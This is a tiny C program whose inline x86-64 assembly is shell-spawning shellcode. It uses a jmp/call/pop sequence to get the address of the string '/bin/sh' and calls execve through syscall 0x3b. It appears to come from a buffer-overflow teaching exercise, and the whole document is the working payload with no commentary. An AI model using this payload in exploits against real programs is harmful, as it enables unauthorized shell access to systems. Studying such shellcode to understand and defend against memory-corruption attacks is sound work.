int main() {
  asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         mov $0x3b, %rax\n\
         mov $0, %rsi\n\
         mov $0, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
  ");
}
